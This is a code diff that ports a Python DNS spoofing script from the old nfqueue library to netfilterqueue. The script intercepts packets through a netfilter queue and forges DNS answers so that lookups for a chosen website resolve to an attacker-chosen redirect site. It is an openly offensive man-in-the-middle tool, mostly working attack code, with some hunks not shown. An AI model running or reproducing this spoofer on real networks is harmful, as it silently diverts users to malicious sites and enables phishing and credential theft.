@@ -1,9 +1,14 @@
-import nfqueue
+import netfilterqueue
 from scapy.all import *
 import argparse
 
+from scapy.layers.dns import DNSQR, DNSRR, DNS
+from scapy.layers.inet import IP, UDP
+
+
+
 def spoof_dns(packet, spoof_website, redirect_website):
-    scapy_packet = IP(packet.get_data())
+    scapy_packet = IP(packet.get_payload())
 
     if scapy_packet.haslayer(DNSQR):
         qname = scapy_packet[DNSQR].qname.decode()
@@ -23,10 +28,10 @@ def spoof_dns(packet, spoof_website, redirect_website):
             del scapy_packet[UDP].chksum
 
             # Set the modified packet as payload
-            packet.set_verdict_modified(nfqueue.NF_ACCEPT, bytes(scapy_packet), len(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
-    else:
-        packet.set_verdict(nfqueue.NF_ACCEPT)
+    packet.accept()
+
 
 def main():
     parser = argparse.ArgumentParser()
@@ -35,21 +40,19 @@ def main():
     args = parser.parse_args()
 
     if not args.spoof_website or not args.redirect_website:
-        parser.error("[-] Please specify both the website to spoof and the redirect website. Use --help for more details.")
+        parser.error("[-] Please specify both the website to spoof and the redirect website. Use --help for more "
+                     "details.")
 
-    q = nfqueue.queue()
-    q.open()
-    q.bind(socket.AF_INET)
-    q.set_callback(lambda packet: spoof_dns(packet, args.spoof_website, args.redirect_website))
-    q.create_queue(0)
+    q = netfilterqueue.NetfilterQueue()
+    q.bind(0, lambda packet: spoof_dns(packet, args.spoof_website, args.redirect_website))
 
     try:
-        q.try_run()
+        print("[+] Waiting for data...")
+        q.run()
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL+C, Exiting...")
-    
-    q.unbind()
-    q.close()
+        q.unbind()
+
 
 if __name__ == '__main__':
     main()
